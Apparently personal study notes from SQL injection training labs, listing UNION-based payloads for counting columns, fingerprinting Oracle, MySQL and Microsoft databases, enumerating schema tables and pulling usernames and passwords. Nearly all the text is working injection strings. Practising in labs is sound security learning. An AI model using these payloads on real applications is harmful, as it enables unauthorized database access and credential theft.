1. **_Lab3 (Union Queries)_**:  
	   
	select users, password from users where username= 'xyz' UNION select user, password from users--
	
	**_union query rule:_** _if the 1st statement has 2 values (column) we can only print 2 values in the 2nd statement. No more or less values could be printed in 2nd statement._
	
	sometimes the 1st statement (backend) is fetching multiple columns but we are not aware how many columns is it fetching, so we
	
	select users, password from users where username= 'xyz' ORDER BY 1 (1st column) ASC/DSC--
	
	ORDER BY 2 (2nd column) ASC/DSC--
	ORDER BY 3 (3rd column) ASC/DSC-- 
	
	if error comes we know only 2 columns are fetched, but if result is displayed that means that there is a 3rd column being fetched in the backend
	
	**_exception:_** select users, password from users where username= 'xyz' UNION select hashes from abc--
	
	_if 2 columns are being fetched in the 1st statement but there is only 1 column in the 2nd statement then what to do_
	
	select users, password from users where username= 'xyz' UNION select hashes, null from abc--
	
	Go to sql injection cheat sheet for learning how queries work in different sql lang
	
	payload: 1' UNION SELECT banner FROM v$version
	
	but 500 error still persists, so we validate the number of columns the query is fetching
	
	1' ORDER BY 1-- 200 ok  
	1' ORDER BY 2-- 200 ok  
	1' ORDER BY 3-- 500 internal server error
	
	payload:  
	1' UNION SELECT banner, null FROM v$version--
	
2. **_Lab4:_**  
	
	DB version in MySQL and Microsoft
		`1' ORDER BY 1-- 500`  
		`1' ORDER BY 2-- 500`
		`1' ORDER BY 1# 200 ok`
	
	payload: 1' UNION SELECT @@version, null#
	
3. **_Lab5:_**
	Information Schema: 
	Stores metadata like total no. of table, total number of dbs, table name, db name etc  
	
	payload1: 
	`1' UNION SELECT table_name, null FROM information_schema.tables--`
	
	payload2:  
	`1' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name='users_laiiki'--`
	
	we get: 
	email 
	username_lfkoex 
	password_rnzjqo
	
	payload3:
	`1' UNION SELECT username_lfkoex, password_rnzjqo FROM users_laiiki--1
	
	We get the id and password for admin login
	
4. **_Lab6:_** 
	
	same as above but for oracle   
	
	paylaod1: 
	`1' UNION SELECT table_name, null FROM information_schema.tables--`
	
	payload2:
	`1' UNION SELECT column_name, null FROM all_tab_columns WHERE table_name='USERS_AEAOBL'--` 
	
	payload3: 
	`1' UNION SELECT USERNAME_RIASNO, PASSWORD_SJKFPO FROM USERS_AEAOBL--`
	
5. **_Lab7:_**
	   
	`1' ORDER BY 1--`   
	`1' ORDER BY 2--`
	`1' ORDER BY 3--`
	
	`1' UNION SELECT null, null, null FROM information_schema.tables--`
	
6. **_Lab8:_**
	
	 **_union query rule:_** _if the 1st statement has 2 values (column) and the input type is int and string then we can only print 2 values in the 2nd statement with the same input type._
	 
	 payload1:
	 `1' UNION SELECT null, 'gT57Zy', null--`
	 
7. **_Lab 9:_**
	
	payload1: 
	`1' UNION SELECT table_name, null FROM information_schema.tables--`
	
	payload2: 
	`1' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name='users'--`
	
	payload3:  
	`1' UNION SELECT username, password FROM users--`
	
8. **_Lab10:_**  
	   
	Solve using concatination 
	payload:
	`1' UNION SELECT 1, 'username'||'password' FROM users--`
	`1' UNION SELECT 1, username||':'||password FROM users--`
	

